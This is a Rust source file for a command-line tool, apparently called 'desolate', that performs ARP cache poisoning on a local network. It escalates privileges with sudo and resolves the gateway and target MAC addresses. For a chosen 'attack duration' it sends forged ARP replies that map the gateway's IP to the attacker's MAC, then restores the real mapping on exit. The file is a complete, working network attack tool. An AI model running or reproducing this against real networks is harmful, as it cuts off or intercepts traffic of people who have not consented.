use clap::Parser;
use pnet::{
    datalink::{interfaces, NetworkInterface},
    ipnetwork::{IpNetwork, Ipv4Network},
    packet::arp::ArpOperations,
    util::MacAddr,
};
use signal_hook::{
    consts::SIGINT,
    iterator::{Signals, SignalsInfo},
};
use std::{
    net::Ipv4Addr,
    process,
    sync::{
        atomic::{AtomicBool, Ordering},
        Arc, Mutex, MutexGuard,
    },
    thread,
    time::{Duration, Instant},
};
use sudo;

use cli::DesolateArgs;
use network::{receive_arp_packet, send_arp_packet};

mod cli;
mod network;
mod recli;

fn main() {
    let desolate_args: DesolateArgs = DesolateArgs::parse();

    sudo::escalate_if_needed().ok();

    recli::infoln!(
        "*{}* ~{}~",
        env!("CARGO_PKG_NAME"),
        env!("CARGO_PKG_VERSION")
    );

    println!();

    // *

    let mut ifaces: Vec<NetworkInterface> = interfaces();
    let mut iface: Option<NetworkInterface> = None;

    while iface.is_none() && desolate_args.iface.is_none() {
        thread::sleep(Duration::from_millis(50));

        for (i, iface) in ifaces.iter().enumerate() {
            let iface_ipv4: Option<&IpNetwork> = iface.ips.iter().find(|ip| ip.is_ipv4());

            let highlight_char = if iface_ipv4
                .map(|ip| ip.ip())
                .map(|ip| !ip.is_loopback() && !ip.is_unspecified())
                .unwrap_or_default()
            {
                '*'
            } else {
                '\0'
            };

            println!(
                "{}",
                recli::process_msg(&*format!(
                    " ~·{}·~  {}{:<11} {:<23}{}",
                    i + 1,
                    highlight_char,
                    iface.name,
                    String::from("ipv4@")
                        + &*iface_ipv4
                            .map(|ip| ip.ip().to_string())
                            .unwrap_or(String::from("n/a")),
                    highlight_char,
                    // ifac.mac.map(|mac| mac.to_string()).unwrap_or(String::from("n/a")),
                ))
            )
        }

        println!();
        recli::info!("*select interface* (enter to refresh): ");

        // *

        let mut iface_rindex_str: String = String::new();
        std::io::stdin().read_line(&mut iface_rindex_str).ok();

        let iface_rindex: Option<usize> = iface_rindex_str.trim().parse().ok();

        if iface_rindex.is_none() || !(1..ifaces.len() + 1).contains(&iface_rindex.unwrap()) {
            for _ in 0..ifaces.len() + 3 {
                print!("\x1b[1F");
            }

            println!("\x1b[J");
            continue;
        }

        iface = ifaces
            .into_iter()
            .nth(iface_rindex.unwrap().saturating_sub(1));

        ifaces = interfaces();
    }

    if let Some(args_iface) = desolate_args.iface {
        recli::infoln!("*selected interface*: {}", args_iface.name);
        iface = Some(args_iface);
    }

    println!();

    // *

    let iface: Arc<NetworkInterface> = Arc::new(iface.unwrap());

    let lock_state: Arc<Mutex<()>> = Arc::new(Mutex::new(()));
    let lock_state_thread: Arc<Mutex<()>> = Arc::clone(&lock_state);

    // *

    let iface_ipv4: Ipv4Network = match iface
        .ips
        .iter()
        .find(|ip| ip.is_ipv4())
        .unwrap_or_else(|| recli::panicln!("*interface does not have ipv4 address assigned*"))
    {
        IpNetwork::V4(iface_ipv4) => iface_ipv4.to_owned(),
        _ => panic!(),
    };

    if iface_ipv4.ip().is_loopback() {
        recli::panicln!("*interface is loopback*")
    }

    let iface_mac: MacAddr = match iface.mac {
        Some(iface_mac) => iface_mac,
        _ => recli::panicln!("*interface does not have mac address assigned*"),
    };

    // *

    let iface_ipv4_network: Ipv4Addr = iface_ipv4.network();
    // let iface_ipv4_broadcast: Ipv4Addr = iface_ipv4.broadcast();

    let mut iface_ipv4_gateway: Ipv4Addr = Ipv4Addr::new(
        iface_ipv4_network.octets()[0],
        iface_ipv4_network.octets()[1],
        iface_ipv4_network.octets()[2],
        iface_ipv4_network.octets()[3] + 1,
    );

    // *

    if let Some(args_gateway_ipv4) = desolate_args.gateway {
        recli::infoln!("*selected gateway*: ~{}~", args_gateway_ipv4);
        iface_ipv4_gateway = args_gateway_ipv4;
    } else {
        recli::info!(
            "*specify gateway* (enter to leave {}): ~",
            iface_ipv4_gateway.to_string()
        );

        let mut iface_ipv4_gateway_str: String = String::new();
        std::io::stdin().read_line(&mut iface_ipv4_gateway_str).ok();

        recli::clreset!();

        iface_ipv4_gateway = match iface_ipv4_gateway_str.trim().parse().ok() {
            Some(iface_ipv4_gateway) => iface_ipv4_gateway,
            _ => {
                print!("\x1b[1F\x1b[2K");
                recli::infoln!("*specify gateway*: ~{}~", iface_ipv4_gateway);
                iface_ipv4_gateway
            }
        };
    }

    // *

    let iface_ipv4_gateway_mac: MacAddr =
        if let Some(args_gateway_mac) = desolate_args.force_gateway_mac {
            args_gateway_mac
        } else {
            let iface_thread: Arc<NetworkInterface> = Arc::clone(&iface);

            thread::spawn(move || {
                for _ in 0..5 {
                    send_arp_packet(
                        ArpOperations::Request,
                        &iface_thread,
                        &(iface_ipv4.ip(), iface_mac),
                        &(iface_ipv4_gateway, MacAddr::broadcast()),
                    );
                }
            });

            match receive_arp_packet(&iface, &iface_ipv4_gateway, Duration::from_secs(10)) {
                Some(iface_ipv4_gateway_mac) => iface_ipv4_gateway_mac,
                _ => recli::panicln!("*unable to receive gateway mac*"),
            }
        };

    recli::infoln!("*gateway mac address*: ~{}~", iface_ipv4_gateway_mac);
    println!();

    // *

    let target_ipv4: Ipv4Addr = if let Some(args_target) = desolate_args.target {
        recli::infoln!("*selected target*: ~{}~", args_target);
        args_target
    } else {
        recli::info!("*specify target*: ~",);

        let mut target_ipv4_str: String = String::new();
        std::io::stdin().read_line(&mut target_ipv4_str).ok();

        recli::clreset!();

        match target_ipv4_str.trim().parse().ok() {
            Some(target_ipv4) => target_ipv4,
            _ => recli::panicln!("*invalid ipv4 address provided*"),
        }
    };

    // *

    let target_mac: MacAddr = if let Some(args_target_mac) = desolate_args.force_target_mac {
        args_target_mac
    } else {
        let iface_thread: Arc<NetworkInterface> = Arc::clone(&iface);

        thread::spawn(move || {
            for _ in 0..5 {
                send_arp_packet(
                    ArpOperations::Request,
                    &iface_thread,
                    &(iface_ipv4.ip(), iface_mac),
                    &(target_ipv4, MacAddr::broadcast()),
                );
            }
        });

        match receive_arp_packet(&iface, &target_ipv4, Duration::from_secs(10)) {
            Some(target_mac) => target_mac,
            _ => recli::panicln!("*unable to receive target mac*"),
        }
    };

    recli::infoln!("*target mac address*: ~{}~", target_mac);
    println!();

    // *

    let attack_duration: Duration =
        if let Some(args_attack_duration) = desolate_args.attack_duration {
            recli::infoln!(
                "*specified attack duration in seconds*: {}",
                args_attack_duration
            );
            Duration::from_secs(args_attack_duration as _)
        } else {
            recli::info!("*specify attack duration in seconds* (enter to leave 60): ");

            let mut attack_duration_str: String = String::new();
            std::io::stdin().read_line(&mut attack_duration_str).ok();

            let attack_duration_seconds: usize = match attack_duration_str.trim().parse().ok() {
                Some(attack_duration_seconds) => attack_duration_seconds,
                _ => 60,
            };

            Duration::from_secs(attack_duration_seconds as _)
        };

    println!();

    // *

    let iface_thread: Arc<NetworkInterface> = Arc::clone(&iface);
    let mut signals: SignalsInfo = Signals::new(&[SIGINT]).unwrap();

    let sigint_state: Arc<AtomicBool> = Arc::new(AtomicBool::new(false));
    let sigint_state_thread: Arc<AtomicBool> = Arc::clone(&sigint_state);

    thread::spawn(move || {
        for _ in signals.forever() {
            sigint_state_thread.store(true, Ordering::Relaxed);

            loop {
                let _lock: Result<MutexGuard<'_, ()>, _> = lock_state_thread.try_lock();

                if _lock.is_err() {
                    continue;
                }

                // *

                println!();
                recli::warnln!("~<sigint>~: *re-arping* ~{}~", target_ipv4);

                let mut packets_count: usize = 0;

                for _ in 0..10 {
                    send_arp_packet(
                        ArpOperations::Reply,
                        &iface_thread,
                        &(iface_ipv4_gateway, iface_ipv4_gateway_mac),
                        &(target_ipv4, target_mac),
                    );

                    packets_count = packets_count.saturating_add(1);

                    recli::infoln!(
                        "*sent arp reply for* ~{}~ · {} packet(s)",
                        target_ipv4,
                        packets_count
                    );
                    thread::sleep(Duration::from_millis(500));

                    print!("\x1b[1F");
                }

                println!("\n");

                process::exit(0)
            }
        }
    });

    // *

    let entry_time: Instant = Instant::now();
    let mut packets_count: usize = 0;

    while entry_time.elapsed() < attack_duration {
        let _lock: Result<MutexGuard<'_, ()>, _> = lock_state.try_lock();

        if _lock.is_err() {
            continue;
        }

        // *

        send_arp_packet(
            ArpOperations::Reply,
            &iface,
            &(iface_ipv4_gateway, iface_mac),
            &(target_ipv4, target_mac),
        );

        packets_count = packets_count.saturating_add(1);

        recli::infoln!(
            "*sent poisoned arp reply for* ~{}~ · {} packet(s)",
            target_ipv4,
            packets_count
        );
        thread::sleep(Duration::from_secs(1));

        print!("\x1b[1F");
    }

    println!();

    // *

    if sigint_state.load(Ordering::Relaxed) {
        return;
    }

    recli::infoln!("*re-arping* ~{}~", target_ipv4);

    let mut packets_count: usize = 0;

    for _ in 0..10 {
        send_arp_packet(
            ArpOperations::Reply,
            &iface,
            &(iface_ipv4_gateway, iface_ipv4_gateway_mac),
            &(target_ipv4, target_mac),
        );

        packets_count = packets_count.saturating_add(1);

        recli::infoln!(
            "*sent arp reply for* ~{}~ · {} packet(s)",
            target_ipv4,
            packets_count
        );
        thread::sleep(Duration::from_millis(500));

        print!("\x1b[1F");
    }

    println!("\n");
}
